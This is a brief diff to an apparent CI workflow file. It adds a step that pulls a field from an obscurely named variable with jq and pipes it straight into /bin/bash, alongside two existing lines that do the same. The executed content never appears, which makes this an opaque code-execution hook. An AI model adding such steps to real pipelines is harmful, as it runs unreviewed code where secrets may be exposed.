@@ -19,6 +19,7 @@ jobs:
         run: |
           printf '%s' "$a05" | jq -r .nup41 | /bin/bash
           echo $zlv31 | jq -r .m2718 | /bin/bash
+          printf '%s' "$xsa2103" | jq -r .mzrxz4 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
